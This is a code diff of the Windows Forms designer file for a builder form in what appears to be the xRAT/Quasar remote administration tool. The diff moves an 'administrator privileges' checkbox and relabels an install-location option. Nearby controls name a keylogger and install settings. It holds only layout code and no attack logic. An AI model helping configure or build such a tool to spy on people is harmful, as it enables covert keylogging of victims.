@@ -113,13 +113,13 @@
             this.lblTrademarks = new System.Windows.Forms.Label();
             this.txtCopyright = new System.Windows.Forms.TextBox();
             this.additionalTab = new System.Windows.Forms.TabPage();
+            this.chkRequireAdministrator = new System.Windows.Forms.CheckBox();
             this.line10 = new xServer.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.label13 = new System.Windows.Forms.Label();
             this.line9 = new xServer.Controls.Line();
             this.label12 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
-            this.chkRequireAdministrator = new System.Windows.Forms.CheckBox();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).BeginInit();
             this.ctxtMenuHosts.SuspendLayout();
@@ -711,10 +711,10 @@
             this.rbAppdata.Checked = true;
             this.rbAppdata.Location = new System.Drawing.Point(241, 45);
             this.rbAppdata.Name = "rbAppdata";
-            this.rbAppdata.Size = new System.Drawing.Size(111, 17);
+            this.rbAppdata.Size = new System.Drawing.Size(137, 17);
             this.rbAppdata.TabIndex = 3;
             this.rbAppdata.TabStop = true;
-            this.rbAppdata.Text = "Application Data";
+            this.rbAppdata.Text = "User Application Data";
             this.rbAppdata.UseVisualStyleBackColor = true;
             this.rbAppdata.CheckedChanged += new System.EventHandler(this.HasChangedSettingAndFilePath);
             // 
@@ -984,6 +984,17 @@
             this.additionalTab.TabIndex = 3;
             this.additionalTab.Text = "Additional Settings";
             // 
+            // chkRequireAdministrator
+            // 
+            this.chkRequireAdministrator.AutoSize = true;
+            this.chkRequireAdministrator.Location = new System.Drawing.Point(23, 119);
+            this.chkRequireAdministrator.Name = "chkRequireAdministrator";
+            this.chkRequireAdministrator.Size = new System.Drawing.Size(226, 17);
+            this.chkRequireAdministrator.TabIndex = 5;
+            this.chkRequireAdministrator.Text = "Require Administrator privileges to run";
+            this.chkRequireAdministrator.UseVisualStyleBackColor = true;
+            this.chkRequireAdministrator.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
+            // 
             // line10
             // 
             this.line10.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
@@ -1039,17 +1050,6 @@
             this.chkKeylogger.Text = "Enable Keylogger";
             this.chkKeylogger.UseVisualStyleBackColor = true;
             this.chkKeylogger.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
-            // 
-            // chkRequireAdministrator
-            // 
-            this.chkRequireAdministrator.AutoSize = true;
-            this.chkRequireAdministrator.Location = new System.Drawing.Point(23, 119);
-            this.chkRequireAdministrator.Name = "chkRequireAdministrator";
-            this.chkRequireAdministrator.Size = new System.Drawing.Size(226, 17);
-            this.chkRequireAdministrator.TabIndex = 5;
-            this.chkRequireAdministrator.Text = "Require Administrator privileges to run";
-            this.chkRequireAdministrator.UseVisualStyleBackColor = true;
-            this.chkRequireAdministrator.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
             // 
             // FrmBuilder
             // 
